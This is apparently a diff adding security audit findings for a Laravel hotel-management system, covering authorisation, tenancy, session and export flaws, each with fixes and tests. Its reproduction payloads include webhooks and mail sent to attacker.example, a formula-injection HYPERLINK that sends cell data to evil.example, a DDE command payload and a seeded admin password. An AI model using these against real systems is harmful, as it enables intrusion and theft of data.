@@ -1,0 +1,589 @@
+[
+  {
+    "fingerprint": "authz:scheduled-reports:runs-as-creator-after-edit-by-other-user",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "medium",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Documents/Http/ScheduledReportController.php", "line": 31, "scope": "ScheduledReportController::update", "description": "PUT /api/v1/scheduled-reports/{id}; only guard is can('reports.manage') (line 82-86); route-bound model is hotel-scoped via BelongsToHotel so the editor must share the hotel"},
+      {"kind": "propagation", "file": "app/Modules/Documents/Http/ScheduledReportController.php", "line": 34, "scope": "ScheduledReportController::update", "description": "fill(validated(partial)) replaces report/params/recipients; created_by is never reset to the editor"},
+      {"kind": "propagation", "file": "app/Modules/Documents/Http/ScheduledReportController.php", "line": 63, "scope": "ScheduledReportController::validated", "description": "'report' may be any ReportRegistry key (payroll-run, general-ledger, police-register...); 'recipients.*' only needs to be an email (line 67)"},
+      {"kind": "propagation", "file": "app/Modules/Documents/Http/ScheduledReportController.php", "line": 50, "scope": "ScheduledReportController::run", "description": "POST .../run lets the same reports.manage editor execute it immediately; comment says 'runs as the schedule's creator'"},
+      {"kind": "propagation", "file": "app/Modules/Documents/Application/ScheduledReportRunner.php", "line": 32, "scope": "ScheduledReportRunner::run", "description": "Auth::guard('api')->setUser($creator) then ctx->set(group, hotel, $creator->allowedHotelIds(), $creator) (line 33)"},
+      {"kind": "propagation", "file": "app/Modules/Documents/Application/InternalApi.php", "line": 50, "scope": "InternalApi::raw", "description": "sub-request dispatched through the router; auth:api resolves the passport RequestGuard whose user was just set to the creator, so the underlying report controller's can() checks pass with the creator's permissions"},
+      {"kind": "sink", "file": "app/Modules/Documents/Application/ScheduledReportRunner.php", "line": 36, "scope": "ScheduledReportRunner::run", "description": "Mail::raw(...)->to($s->recipients)->attachData(rendered report): report rendered with the creator's rights is sent to editor-chosen addresses"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Documents/Http/ScheduledReportController.php", "line": 85, "description": "abort_unless($u->can('reports.manage') || ...) is the only check; no ownership check against created_by"},
+      {"file": "app/Modules/Documents/Application/ScheduledReportRunner.php", "line": 27, "description": "$user = User::find($s->created_by) - identity is always the original creator"},
+      {"file": "app/Modules/Documents/Application/ReportRegistry.php", "line": 57, "description": "'payroll-run' => path 'payroll/runs/{run}' and line 39 'general-ledger' - endpoints that require payroll.view / accounting.view, which a reports.manage-only user (e.g. hotel-owner role '*.view'+'reports.*' lacks payroll data? no: hotel-owner has *.view) - the gap is for roles with reports.manage but without accounting/payroll view"},
+      {"file": "database/seeders/RolesAndPermissionsSeeder.php", "line": 31, "description": "finance-director has reports.* (manage) and all accounting; a lower user with a custom role holding reports.manage only would exploit this"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "Attacker holds reports.manage but lacks the permission of the target report endpoint (payroll.view, accounting.view, guests/police register)"},
+      {"kind": "data_state", "description": "A scheduled report created by a more privileged user exists in a hotel the attacker can access (hotel scope on the model)"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Staff user B with reports.manage (no payroll/accounting permission) in hotel H where finance director A created a scheduled report",
+      "payloads": ["PUT /api/v1/scheduled-reports/{id} {\"report\":\"general-ledger\",\"params\":{},\"recipients\":[\"b@attacker.example\"]}", "POST /api/v1/scheduled-reports/{id}/run"],
+      "instructions": ["Authenticate as B with X-Hotel-Id: H", "Send the PUT to repoint the report and recipients", "Send POST .../run", "Check the mailbox / log mailer output"],
+      "expected_result": "last_status = 'sent'; the general-ledger (or payroll-run) export rendered with A's permissions arrives at b@attacker.example although GET /api/v1/accounting/reports/general-ledger as B returns 403"
+    },
+    "blockers": [],
+    "smallest_fix": "In update(): set created_by = $request->user()->id when report/params/recipients change (re-own the schedule), and in run(): execute as $request->user() instead of created_by; alternatively forbid editing schedules you did not create.",
+    "regression_test": "Follow tests/Feature/Documents/DocumentsTest.php (scheduled-reports section) and tests/Feature/Platform/RbacMatrixTest.php: create a schedule as a finance-director user, then as a user with reports.manage only PUT report=general-ledger + recipients=[b@x] and POST /run; assert last_status === 'failed' (403 from the inner endpoint) and Mail::fake() has no message to b@x."
+  },
+  {
+    "fingerprint": "tenancy:webhooks:hotel-id-not-checked-against-allowed-hotels",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "medium",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Platform/Http/WebhookController.php", "line": 21, "scope": "WebhookController::store", "description": "POST /api/v1/webhooks behind auth:api+tenant; guard is only can('integrations.manage') (line 23)"},
+      {"kind": "propagation", "file": "app/Modules/Platform/Http/WebhookController.php", "line": 28, "scope": "WebhookController::store", "description": "'hotel_id' => ['nullable','integer'] - no exists rule, no check against $request->user()->allowedHotelIds(); null = every hotel of the group"},
+      {"kind": "propagation", "file": "app/Modules/Platform/Http/WebhookController.php", "line": 31, "scope": "WebhookController::store", "description": "WebhookSubscription::create($data + secret); model uses BelongsToGroup only (Domain/WebhookSubscription.php line 10), hotel_id stored verbatim"},
+      {"kind": "propagation", "file": "app/Modules/Platform/Application/QueueWebhookDeliveries.php", "line": 21, "scope": "QueueWebhookDeliveries::forEvent", "description": "subscriptions selected where group matches and (hotel_id IS NULL OR hotel_id = event.hotel_id)"},
+      {"kind": "sink", "file": "app/Modules/Platform/Application/QueueWebhookDeliveries.php", "line": 36, "scope": "QueueWebhookDeliveries::forEvent", "description": "DeliverWebhook::dispatch($id) posts the event envelope of hotel B (or all hotels) to the attacker's URL"}
+    ],
+    "evidence": [
+      {"file": "app/Platform/Tenancy/ResolveTenant.php", "line": 33, "description": "The per-user hotel allow-list (allowedHotelIds) is enforced for X-Hotel-Id, showing hotel scoping is an intended control that the webhook body bypasses"},
+      {"file": "app/Modules/Platform/Domain/WebhookSubscription.php", "line": 12, "description": "$guarded = ['id','group_id'] - hotel_id is mass-assignable from the request"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "Actor holds integrations.manage"},
+      {"kind": "data_state", "description": "Actor has all_hotels=false (hotel-limited); otherwise group-wide subscription is legitimate"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Hotel-A-only staff with integrations.manage wants hotel B's reservation/payment/HR events",
+      "payloads": ["POST /api/v1/webhooks {\"url\":\"https://attacker.example/hook\",\"event_types\":[\"*\"],\"hotel_id\":<B id>}", "POST /api/v1/webhooks {\"url\":\"https://attacker.example/hook\",\"event_types\":[\"*\"]}"],
+      "instructions": ["Authenticate as the hotel-A user with X-Hotel-Id: A", "Create the subscription with hotel_id of hotel B or omitted", "Trigger any event in hotel B (e.g. a booking)", "Observe webhook_deliveries rows and the POST at the attacker URL"],
+      "expected_result": "Subscription created (201); hotel B events are delivered to the attacker's endpoint although the user cannot send X-Hotel-Id: B"
+    },
+    "blockers": [],
+    "smallest_fix": "Validate hotel_id with Rule::exists('hotels','id')->where('group_id', $user->group_id); when $user->allowedHotelIds() !== null require hotel_id to be in that list and reject null (or default it to the active hotel).",
+    "regression_test": "Follow tests/Feature/Platform/TenancyIsolationTest.php: user limited to hotel A with integrations.manage POSTs /api/v1/webhooks with hotel_id=B -> assertStatus(422); with hotel_id omitted -> 422 (or assert stored hotel_id === A)."
+  },
+  {
+    "fingerprint": "tenancy:edge:child-row-parent-check-accepts-sister-hotel",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "low",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Edge/Http/EdgeSyncController.php", "line": 13, "scope": "EdgeSyncController::push", "description": "POST /api/v1/edge/sync/push (public-routes.php line 8, throttle:api only) authenticated by node signature; changes[].table/row_id/op/data are node-chosen (raw input kept at line 31)"},
+      {"kind": "propagation", "file": "app/Modules/Edge/Application/CloudSync.php", "line": 181, "scope": "CloudSync::tenantViolation", "description": "For tables without hotel_id/group_id columns the parent row is looked up via TablePolicy::PARENTS (line 182-183)"},
+      {"kind": "propagation", "file": "app/Modules/Edge/Application/CloudSync.php", "line": 184, "scope": "CloudSync::tenantViolation", "description": "if (! $p || (int)($p['hotel_id'] ?? 0) !== $node->hotel_id && (int)($p['group_id'] ?? 0) !== $node->group_id) - && binds tighter than ||, so a parent in hotel B of the same group (group matches) is accepted"},
+      {"kind": "propagation", "file": "app/Modules/Edge/Application/CloudSync.php", "line": 143, "scope": "CloudSync::apply", "description": "op=delete -> rows->delete; op=upsert -> rows->upsert for 'operational' tables (line 149)"},
+      {"kind": "sink", "file": "app/Modules/Edge/Application/RowStore.php", "line": 28, "scope": "RowStore::upsert / delete (line 69)", "description": "DB::table($table)->where('id',$id)->update/insert/delete with no tenant predicate"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Edge/Application/TablePolicy.php", "line": 40, "description": "'reservation_nights' => ['reservations','reservation_id'] and pos_check_lines, loyalty_cards etc. are child tables with no tenant columns (lines 33-43)"},
+      {"file": "app/Modules/Edge/Application/CloudSync.php", "line": 173, "description": "Comment: 'an edge cannot take over a row owned by another tenant' - the intended control; direct hotel_id rows are correctly rejected at line 175-177"},
+      {"file": "tests/Feature/Edge/EdgeSyncTest.php", "line": 198, "description": "test_tenant_isolation only forges rooms/hotels rows (tables with hotel_id); the PARENTS branch is untested"}
+    ],
+    "conditions": [
+      {"kind": "authentication_level", "description": "Attacker holds an active edge-node secret of any hotel in the group (compromised on-premise box or leaked secret)"},
+      {"kind": "data_state", "description": "Target row is in a TablePolicy::PARENTS table whose parent belongs to another hotel of the same group; for upserts the changed_at must be newer than cloud changes (LWW, line 132-139)"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Operator of hotel A's edge node (or holder of its secret) in a two-hotel group",
+      "payloads": ["{\"batch_key\":\"x\",\"from_cursor\":1,\"to_cursor\":2,\"changes\":[{\"seq\":1,\"table\":\"reservation_nights\",\"row_id\":<night id of hotel B reservation>,\"op\":\"upsert\",\"changed_at\":\"<future ISO>\",\"data\":{\"id\":<night id>,\"reservation_id\":<B res id>,\"amount\":0}}]}", "same with \"op\":\"delete\" on a hotel-B pos_check_lines row"],
+      "instructions": ["Sign the request with Signature::headers(nodeId, secret, 'POST', 'api/v1/edge/sync/push', body)", "POST to /api/v1/edge/sync/push", "Read the hotel B row"],
+      "expected_result": "Response reports 'applied' (no tenant_rejected conflict); hotel B's reservation_night amount is rewritten / pos_check_line deleted"
+    },
+    "blockers": [],
+    "smallest_fix": "Parenthesise and require a hotel match whenever the parent has a hotel_id column: if (! $p || (array_key_exists('hotel_id',$p) ? (int)$p['hotel_id'] !== $node->hotel_id : (int)($p['group_id'] ?? 0) !== $node->group_id)) return 'Parent row is not owned by this hotel.';",
+    "regression_test": "Extend tests/Feature/Edge/EdgeSyncTest.php::test_tenant_isolation: create a reservation + reservation_nights row in the sister hotel, push an upsert and a delete for it from this node, assert the response counts 2 conflicts with rule 'tenant_rejected' and the row is unchanged."
+  },
+  {
+    "fingerprint": "session:suspension-does-not-invalidate-web-sessions",
+    "verdict": "confirmed",
+    "severity": "high",
+    "likelihood": "high",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Tenancy/Http/UserController.php", "line": 61, "scope": "UserController::update", "description": "PATCH /api/v1/users/{user} status=suspended (also set automatically by HR termination: app/Modules/HR/Application/HrService.php line 144)"},
+      {"kind": "propagation", "file": "app/Modules/Tenancy/Http/UserController.php", "line": 81, "scope": "UserController::update", "description": "only $user->tokens()->update(['revoked'=>true]); no sessions purge, no remember_token rotation, no password invalidation"},
+      {"kind": "propagation", "file": "app/Http/Controllers/Auth/AuthenticatedSessionController.php", "line": 31, "scope": "AuthenticatedSessionController::store", "description": "Auth::guard('web')->validate($credentials) then login (line 45): users.status is never consulted, so a suspended user can even sign in again with their password"},
+      {"kind": "propagation", "file": "app/Platform/Tenancy/ResolveTenant.php", "line": 21, "scope": "ResolveTenant::handle", "description": "per-request tenant resolution reads the user but never its status; no middleware anywhere checks users.status (grep: only StaffDirectory/StaffController filter listings)"},
+      {"kind": "sink", "file": "bootstrap/app.php", "line": 33, "scope": "withMiddleware web group", "description": "CreateFreshApiToken re-issues the laravel_token API cookie on every web response, so the suspended user keeps full /api/v1 access via the session"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Admin/Application/LoginGuard.php", "line": 41, "description": "locked() only looks at locked_until (lockout), not status"},
+      {"file": "app/Modules/Admin/Http/TokenController.php", "line": 23, "description": "POST /api/v1/auth/token validates credentials with no status check either (file contains no reference to status)"},
+      {"file": "config/session.php", "line": 21, "description": "SESSION_DRIVER defaults to database, so per-user purge (sessions.user_id) is available but unused"},
+      {"file": "app/Modules/HR/Application/HrService.php", "line": 144, "description": "terminate() sets users.status='suspended' expecting that to end access"}
+    ],
+    "conditions": [
+      {"kind": "data_state", "description": "Target account was suspended/terminated; attacker knows the password or still holds a session/remember cookie"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Terminated employee whose HR record was closed (users.status='suspended')",
+      "payloads": ["POST /login {email, password}", "GET /dashboard with the existing session cookie", "GET /api/v1/me with the laravel_token cookie"],
+      "instructions": ["As admin PATCH /api/v1/users/{id} {\"status\":\"suspended\"} (or terminate the employee)", "As the suspended user, POST /login with the still-valid password, or reuse the browser session", "Call any staff API"],
+      "expected_result": "Login succeeds (302 to dashboard) and all permitted API calls return 200; only personal access tokens issued before suspension are refused"
+    },
+    "blockers": [],
+    "smallest_fix": "Add a status check in AuthenticatedSessionController::store, TokenController::store and DemoLoginController (refuse status==='suspended'), add a lightweight middleware on web+api groups that logs out / 401s when $request->user()->status === 'suspended', and on suspension delete sessions where user_id = $user->id and rotate remember_token.",
+    "regression_test": "Add to tests/Feature/Security/AuthHardeningTest.php: create user, suspend via PATCH as admin, then (a) POST /login with correct password -> 422/423, (b) actingAs via existing session GET /dashboard -> redirect to /login, (c) GET /api/v1/me -> 401."
+  },
+  {
+    "fingerprint": "config:demo-logins:env-gate-and-mfa-bypass",
+    "verdict": "needs_validation",
+    "severity": null,
+    "likelihood": "low",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "routes/web.php", "line": 18, "scope": "routes/web.php guest group", "description": "POST /demo-login/{login} (guest middleware, throttle:20,1, CSRF)"},
+      {"kind": "propagation", "file": "config/app.php", "line": 22, "scope": "config app.demo_logins", "description": "env('DEMO_LOGINS', false) && env('APP_ENV') !== 'production' - any other APP_ENV string (staging, prod, uat, demo) passes"},
+      {"kind": "propagation", "file": "app/Http/Controllers/Auth/DemoLoginController.php", "line": 29, "scope": "DemoLoginController::store", "description": "abort_unless(config('app.demo_logins'),404); login name must be 'admin' or a DemoUsersSeeder::USERS key (line 30)"},
+      {"kind": "propagation", "file": "app/Http/Middleware/HandleInertiaRequests.php", "line": 125, "scope": "HandleInertiaRequests::mustEnrol", "description": "demo_login session flag (set at DemoLoginController line 39) disables mandatory MFA enrolment while the flag is on"},
+      {"kind": "sink", "file": "app/Http/Controllers/Auth/DemoLoginController.php", "line": 36, "scope": "DemoLoginController::store", "description": "Auth::guard('web')->login($user) - admin@opeshotelsoft.test (group-owner, role '*') without password or MFA"}
+    ],
+    "evidence": [
+      {"file": ".env.production.example", "line": 16, "description": "DEMO_LOGINS=false in the production template - the control exists but is a single env flag"},
+      {"file": "tests/Feature/Platform/DemoLoginTest.php", "line": 10, "description": "Existing tests only toggle config('app.demo_logins'), they do not test the APP_ENV expression"}
+    ],
+    "conditions": [
+      {"kind": "system_configuration", "description": "DEMO_LOGINS=true on an internet-reachable instance whose APP_ENV is not exactly 'production'"},
+      {"kind": "data_state", "description": "DemoUsersSeeder has run on that database"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Anonymous internet user on a staging/UAT host with DEMO_LOGINS=true",
+      "payloads": ["GET /login (lists demo accounts)", "POST /demo-login/admin with CSRF token"],
+      "instructions": ["Open /login and read the demo account list", "Submit the demo-login form for 'admin'", "Browse /dashboard and call /api/v1 with the issued laravel_token cookie"],
+      "expected_result": "Authenticated group-owner session without password or MFA"
+    },
+    "blockers": ["Decisive fact is deployment: whether any internet-facing instance runs with DEMO_LOGINS=true and APP_ENV != 'production' (e.g. staging holding real data). In source the gate works as documented; the weakness is that the gate is a deny-list on one string rather than an allow-list."],
+    "rejection_reason": null,
+    "smallest_fix": "Gate on an allow-list: 'demo_logins' => env('DEMO_LOGINS', false) && in_array(env('APP_ENV'), ['local','testing','demo'], true); abort(404) in DemoLoginController when app()->isProduction(); log a boot-time warning when the flag is on.",
+    "regression_test": "Extend tests/Feature/Platform/DemoLoginTest.php: evaluate the config expression with APP_ENV=staging and DEMO_LOGINS=true and assert POST /demo-login/admin returns 404."
+  },
+  {
+    "fingerprint": "secrets:seeder:demo-admin-fixed-password-in-default-seeder",
+    "verdict": "confirmed",
+    "severity": "high",
+    "likelihood": "high",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "docs/DEPLOY.md", "line": 39, "scope": "Production install steps (docker line 39, bare-metal line 105)", "description": "'php artisan db:seed --force  # once, first install only' - the documented production install runs the default seeder"},
+      {"kind": "propagation", "file": "database/seeders/DatabaseSeeder.php", "line": 13, "scope": "DatabaseSeeder::run", "description": "calls DemoSeeder unconditionally (no environment guard)"},
+      {"kind": "propagation", "file": "database/seeders/DemoSeeder.php", "line": 34, "scope": "DemoSeeder::run", "description": "Group::firstOrCreate(['slug'=>'opes-demo']) - this is the ONLY code path in the repository that creates a Group (grep app/ database/), so a production install's real tenant is this group"},
+      {"kind": "propagation", "file": "database/seeders/DemoSeeder.php", "line": 52, "scope": "DemoSeeder::run", "description": "calls DemoUsersSeeder"},
+      {"kind": "sink", "file": "database/seeders/DemoUsersSeeder.php", "line": 48, "scope": "DemoUsersSeeder::run", "description": "admin@opeshotelsoft.test created with password 'Admin@2026!' and role group-owner ('*', line 49); 20+ staff with 'Demo@2026!' (line 52)"}
+    ],
+    "evidence": [
+      {"file": "routes/web.php", "line": 19, "description": "POST /login accepts the seeded credentials; AuthenticatedSessionController has no status/environment guard"},
+      {"file": "app/Modules/Admin/public-routes.php", "line": 7, "description": "POST /api/v1/auth/token also accepts them (API access without the web MFA enrolment prompt - see AuthHardeningTest::test_token_issued_without_2fa)"},
+      {"file": "database/seeders/RolesAndPermissionsSeeder.php", "line": 30, "description": "'group-owner' => '*'"}
+    ],
+    "conditions": [
+      {"kind": "system_configuration", "description": "Operator followed docs/DEPLOY.md and ran db:seed on the production database (the documented first-install step) and did not change the admin password"},
+      {"kind": "user_interaction", "description": "None beyond knowing the public seeder"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Anonymous internet user who has read the public repository",
+      "payloads": ["POST /login {\"email\":\"admin@opeshotelsoft.test\",\"password\":\"Admin@2026!\"}", "POST /api/v1/auth/token {\"email\":\"admin@opeshotelsoft.test\",\"password\":\"Admin@2026!\",\"device_name\":\"x\"}"],
+      "instructions": ["Submit the login form or token request on the target host", "If MFA enrolment is required in the web UI, enrol an attacker TOTP device (no second factor existed before)", "Use the group-owner session"],
+      "expected_result": "Full group-owner access to the production tenant (users, payroll, accounting, exports)"
+    },
+    "blockers": [],
+    "smallest_fix": "Remove DemoSeeder from DatabaseSeeder (keep RolesAndPermissionsSeeder only) and provide an interactive artisan command (e.g. ops:create-owner) that creates the real group and owner with a random or prompted password; make DemoSeeder/DemoUsersSeeder return early when app()->isProduction() unless an explicit flag is passed.",
+    "regression_test": "New unit test next to tests/Feature/Platform/DemoLoginTest.php: with app()->detectEnvironment(fn()=>'production') run DatabaseSeeder and assert User::where('email','admin@opeshotelsoft.test')->doesntExist() and Hash::check('Admin@2026!', ...) is never true for any seeded user."
+  },
+  {
+    "fingerprint": "rate-limit:trust-proxies-star-xff-spoof",
+    "verdict": "needs_validation",
+    "severity": null,
+    "likelihood": "medium",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "bootstrap/app.php", "line": 20, "scope": "withMiddleware", "description": "$middleware->trustProxies(at: '*') with default headers - X-Forwarded-For from any peer is honoured for $request->ip()"},
+      {"kind": "propagation", "file": "app/Modules/Admin/Application/LoginGuard.php", "line": 28, "scope": "LoginGuard::key", "description": "'login:'.email.'|'.$ip - email+IP throttle key; attacker rotates the XFF value per request"},
+      {"kind": "propagation", "file": "app/Platform/ModuleServiceProvider.php", "line": 31, "scope": "ModuleServiceProvider::boot", "description": "public-write (20/min), public-read (300/min) and api limiters keyed by $r->ip()"},
+      {"kind": "propagation", "file": "app/Modules/Admin/AdminModule.php", "line": 22, "scope": "AdminModule::boot", "description": "auth-token limiter keyed by ip|route"},
+      {"kind": "propagation", "file": "app/Modules/MemberPortal/Application/MemberAuthService.php", "line": 283, "scope": "MemberAuthService::limiterKey", "description": "member-login limiter identifier|ip"},
+      {"kind": "sink", "file": "routes/web.php", "line": 19, "scope": "routes/web.php guest group", "description": "throttle:10,1 on POST /login (and two-factor-challenge line 23) keyed by IP becomes per-attacker-chosen string; residual control is the per-account lockout in LoginGuard"}
+    ],
+    "evidence": [
+      {"file": "docker/nginx/default.conf", "line": 1, "description": "Shipped nginx expects an upstream TLS proxy and does not set/overwrite X-Forwarded-For (no proxy_set_header/real_ip directives in docker/), so it forwards whatever the client sent"},
+      {"file": "docs/DEPLOY.md", "line": 57, "description": "Docs say trusted proxies should be 127.0.0.1/the Docker network, contradicting '*' in code"}
+    ],
+    "conditions": [
+      {"kind": "system_configuration", "description": "The first hop reachable by the attacker does not overwrite X-Forwarded-For (nginx container exposed directly, or a proxy that appends instead of replaces)"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Anonymous attacker brute-forcing a staff email or spamming public booking/OTP endpoints",
+      "payloads": ["POST /login with header X-Forwarded-For: 10.0.0.<n> (n incremented per request)", "POST /api/v1/auth/token with rotating X-Forwarded-For"],
+      "instructions": ["Send 30 wrong-password requests for one email, changing X-Forwarded-For each time", "Observe whether a 429 ever appears before the account lock (10 failures)"],
+      "expected_result": "No 429; only the per-account lock after 10 failures limits password guessing (~40/h per account); public endpoints with no per-account counter are unlimited and audit logs record attacker-chosen IPs"
+    },
+    "blockers": ["Whether the production edge proxy (Caddy per docs/DEPLOY.md, or any LB) replaces rather than appends X-Forwarded-For, and whether the docker nginx is ever exposed directly. Caddy >= 2.5 ignores client-supplied XFF unless trusted_proxies is configured, which would neutralise this; an appending proxy or direct exposure would not."],
+    "rejection_reason": null,
+    "smallest_fix": "trustProxies(at: env('TRUSTED_PROXIES') ? explode(',', env('TRUSTED_PROXIES')) : ['127.0.0.1','10.0.0.0/8','172.16.0.0/12','192.168.0.0/16'], headers: Request::HEADER_X_FORWARDED_FOR | Request::HEADER_X_FORWARDED_PROTO); document TRUSTED_PROXIES in .env.production.example.",
+    "regression_test": "Add to tests/Feature/Security/AuthHardeningTest.php next to test_throttle_returns_429: 12 POST /login with wrong password from REMOTE_ADDR 203.0.113.5 and distinct X-Forwarded-For values -> assert the 11th returns 429."
+  },
+  {
+    "fingerprint": "public:booking:corporate-code-low-entropy-bills-company",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "medium",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/GuestPortal/Http/BookingEngineController.php", "line": 108, "scope": "BookingEngineController::book", "description": "public POST /api/v1/booking/{group}/reservations accepts corporate_code (nullable string max:24); throttle public-write 20/min/ip; availability (GET, 300/min) accepts the same input"},
+      {"kind": "propagation", "file": "app/Modules/Reservations/Revenue/Application/BookingSiteRevenue.php", "line": 32, "scope": "BookingSiteRevenue::decorate / prepare", "description": "corporate->find(code) and, when found, corporate offers with negotiated totals are returned -> validity oracle"},
+      {"kind": "propagation", "file": "app/Modules/Reservations/Revenue/Application/CorporateService.php", "line": 126, "scope": "CorporateService::find", "description": "CorporateContract::where('code', strtoupper(trim($code)))->where('active', true) - the code is the only credential"},
+      {"kind": "propagation", "file": "app/Modules/Reservations/Revenue/Http/OffersController.php", "line": 67, "scope": "OffersController::contracts (create)", "description": "codes are staff-chosen, regex [A-Za-z0-9_-]{1,20}, unique per hotel - typically a company name"},
+      {"kind": "sink", "file": "app/Modules/Reservations/Revenue/Application/CorporateService.php", "line": 172, "scope": "CorporateService::bookingFields", "description": "reservation created with company_id, contract rate_plan_id, room_block_id (allotment) and source 'corporate:<code>' (consumed by ReservationService::create line 84)"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Reservations/Revenue/Application/CorporateService.php", "line": 165, "description": "bookingFields() has no traveller/email-domain check; only availability and contract validity are tested"},
+      {"file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 216, "description": "invoice(): bill_to_name/tax_id/address default to the company when folio->company_id is set - billing impact depends on whether folio routing copies reservation.company_id (not verified)"}
+    ],
+    "conditions": [
+      {"kind": "data_state", "description": "An active corporate contract with a guessable code exists for the hotel"},
+      {"kind": "data_state", "description": "Billing to the company's city ledger additionally depends on folio routing rules for company reservations (unverified)"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Anonymous website visitor",
+      "payloads": ["GET /api/v1/booking/{group}/availability?hotel_code=X&arrival=..&departure=..&corporate_code=ACME", "POST /api/v1/booking/{group}/reservations {..., \"corporate_code\":\"ACME\", \"rate_plan_id\":<contract plan>}"],
+      "instructions": ["Enumerate likely company names/abbreviations against availability (300/min per IP) until a response contains 'corporate' offers", "Book with the found code"],
+      "expected_result": "Reservation at the confidential negotiated rate, drawing from the company's allotment, with company_id set on the reservation"
+    },
+    "blockers": [],
+    "smallest_fix": "Generate corporate booking codes server-side with >= 64 bits of entropy (or require a company email domain match on the public channel), rate-limit corporate_code lookups per IP with lockout, and leave company_id null / status pending for public corporate bookings until staff confirm.",
+    "regression_test": "Follow tests/Feature/GuestPortal/BookingEngineMoreTest.php: availability with an invalid corporate_code returns the same offers as without; a public booking with a valid code produces a reservation with company_id null (or status 'pending-validation')."
+  },
+  {
+    "fingerprint": "export:csv:formula-injection",
+    "verdict": "confirmed",
+    "severity": "low",
+    "likelihood": "medium",
+    "impact": "low",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/GuestPortal/Http/BookingEngineController.php", "line": 104, "scope": "BookingEngineController::book", "description": "guest.first_name / last_name (max:100) and special_requests (max:1000) accepted as free strings from the public booking API"},
+      {"kind": "propagation", "file": "app/Modules/Documents/Application/Exporter.php", "line": 64, "scope": "Exporter::cell", "description": "cell() passes strings through unchanged (only bools/arrays are converted)"},
+      {"kind": "sink", "file": "app/Modules/Documents/Application/Exporter.php", "line": 79, "scope": "Exporter::csv", "description": "fputcsv($out, $r, ';', '\"', '') with no neutralisation of leading = + - @ \\t \\r; same in app/Modules/Accounting/Support/Sheets.php line 40 and the OpenSpout xlsx writer (line 95)"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Documents/Application/ReportRegistry.php", "line": 55, "description": "'police-register' export includes full_name and other guest-supplied text columns"},
+      {"file": "app/Modules/Documents/Http/ExportController.php", "line": 1, "description": "GET /api/v1/exports/{report} downloads the CSV/XLSX for staff (reports.view)"}
+    ],
+    "conditions": [
+      {"kind": "user_interaction", "description": "Staff opens the export in Excel/LibreOffice and accepts the DDE/external-content prompt (CSV formulas evaluate by default; command execution needs an extra confirmation)"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Anonymous guest booking online",
+      "payloads": ["guest.last_name = \"=HYPERLINK(\\\"http://evil.example/\\\"&A1,\\\"click\\\")\"", "special_requests = \"=cmd|'/C calc'!A0\""],
+      "instructions": ["Book via the public API with the payload as last name", "As staff download /api/v1/exports/police-register?format=csv", "Open in Excel"],
+      "expected_result": "The cell is evaluated as a formula on the staff workstation"
+    },
+    "blockers": [],
+    "smallest_fix": "In Exporter::cell() and Sheets::csv(): when a string starts with one of = + - @ \\t \\r, prefix it with a single quote (') ; for xlsx force a string cell type.",
+    "regression_test": "Unit test beside tests/Feature/Documents/DocumentsTest.php: Exporter::render for a report whose row contains '=1+1' -> assert the CSV cell begins with \"'=\"."
+  },
+  {
+    "fingerprint": "public:paylink:dryrun-autosucceed-nonprod",
+    "verdict": "needs_validation",
+    "severity": null,
+    "likelihood": "low",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Payments/Http/PublicPaymentController.php", "line": 55, "scope": "PublicPaymentController::status", "description": "public GET status with manage token -> payments->refresh($intent) (line 61); same via PublicPayLinkController::status line 50-56"},
+      {"kind": "propagation", "file": "app/Modules/Payments/Application/PaymentService.php", "line": 42, "scope": "PaymentService::driverFor", "description": "no credentials: throws only when app()->isProduction(); otherwise returns new DryRunGateway (line 46); driverOf (line 59) also returns DryRun for any intent stored with driver='dry_run'"},
+      {"kind": "propagation", "file": "app/Modules/Payments/Application/Drivers/DryRunGateway.php", "line": 37, "scope": "DryRunGateway::status", "description": "returns 'succeeded' (or 'failed' for the simulated-failure case)"},
+      {"kind": "propagation", "file": "app/Modules/Payments/Application/PaymentService.php", "line": 144, "scope": "PaymentService::refresh", "description": "non-pending status -> settle($intent, $status)"},
+      {"kind": "sink", "file": "app/Modules/Payments/Application/PaymentService.php", "line": 224, "scope": "PaymentService::settle", "description": "folios->payment(...) posts the folio payment line and Reservation deposit_paid is incremented (line 230-231) with no money received"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Payments/Application/PaymentService.php", "line": 42, "description": "Explicit production gate exists: 'gateway-not-configured' DomainException when app()->isProduction()"},
+      {"file": "app/Modules/Payments/Application/Payouts/PayoutService.php", "line": 82, "description": "Same pattern for disbursements (DryRunDisbursement)"}
+    ],
+    "conditions": [
+      {"kind": "system_configuration", "description": "Internet-facing instance with APP_ENV !== 'production' and a hotel without gateway credentials, or an intent that was created while dry-run was active"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Anonymous guest holding a manage-booking token (returned by the public booking API)",
